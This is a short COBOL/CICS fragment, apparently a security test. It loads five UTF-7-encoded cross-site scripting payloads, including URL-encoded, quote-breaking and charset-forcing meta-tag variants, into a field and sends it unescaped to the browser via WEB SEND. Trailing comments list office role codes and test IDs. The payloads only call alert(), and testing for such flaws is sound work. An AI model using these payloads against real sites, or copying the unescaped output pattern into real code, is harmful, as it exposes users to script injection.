
      * VARIANT-1: MOST BASIC PATTERN
        MOVE '+ADw-script+AD4-alert(ID)+ADw-/script+AD4-' TO EIDPIPPO.

      * VARIANT-2: URL ENCODED MOST BASIC PATTERN

         MOVE '%2BADw-script+AD4-alert(ID)%2BADw-/script%2BAD4-' 
            TO EIDPIPPO.

      * VARIANT-3: WITH QUOTE
        MOVE '+ACIAPgA8-script+AD4-alert(ID)+ADw-/script+AD4APAAi-' 
        TO EIDPIPPO.

      * VARIANT-4: URL ENCODED WITH QUOTE
         MOVE '%2BACIAPgA8-script%2BAD4-alert%28ID%29%2BADw-%2Fscript%2BAD4APAAi-' 
          TO EIDPIPPO.

      * VARIANT-5: INJECTED META TAG
         MOVE '+ADw-/title+AD4APA-meta http-equiv+AD0-'content-type' content
         +AD0-'text/html+ADs-charset+AD0-utf-7'+AD4-' TO EIDPIPPO.


       EXEC CICS

       WEB SEND

       FROM(EIDPIPPO)

       END-EXEC.


      * SSABDC00  - DEPOSITO CENTRALE
      * SSABUC00  - UFFICIO CENTRALE
      * SSABDP00  - DEPOSITO PROVINCIALE
      * SSABUP00  - UFFICIO PERIFERICO
      * ADMORMON  - DIRETTORE UFFICIO PERIFERICO



      *TEST3022, TEST3003

      *TEST3023